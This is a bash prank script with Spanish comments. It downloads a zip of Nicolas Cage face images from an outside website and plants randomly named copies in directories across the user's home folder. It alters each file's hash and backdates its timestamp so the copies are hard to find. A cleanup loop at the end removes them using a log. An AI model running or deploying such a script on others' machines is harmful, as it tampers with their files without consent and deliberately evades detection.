#!/bin/bash

temp_d=$(mktemp -d)
echo "" > ~/.caged.log
cd $temp_d
wget "http://jose-linares.com/Nicolas_Cage_Faces.zip" -q -O NCF.zip		#Descarga el pastel
find ~ -type d -maxdepth 3 -mindepth 1 > directorios					#Lista los directorios objetivo

unzip NCF.zip	2> /dev/null > /dev/null								#Descomprime

contador=0
while read dire ;do
	((contador++))
	imagen="$((($contador%22)+1)).jpg"
	imagen2=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $((($RANDOM%20)+1)) | head -n 1)".jpg"
	if [[ ! -e $dire/$imagen ]] ; then   								#Se asegura de que no exista
        cp -n "$imagen" "$dire/$imagen2"           						#Copia la imagen en el directorio
        hora=$(($RANDOM%10000))
        echo $hora >> "$dire/$imagen2"									#Añade números al final para que el hash de cada imagen sea distinto y no se pueda hacer una búsqueda por md5
        touch -t "$hora hours ago" "$dire/$imagen2"						# Cambia la fecha de modificación para que no sea fácil de encontrar
        echo $dire/$imagen2 >> ~/.caged.log            					#Guarda log por si se enfadan
    fi
done < directorios

exit 0

#Para borrarlo todo:
while read r; do 
	rm -f "$r"; 
done < ~/.caged.log
rm -f ~/.caged.log
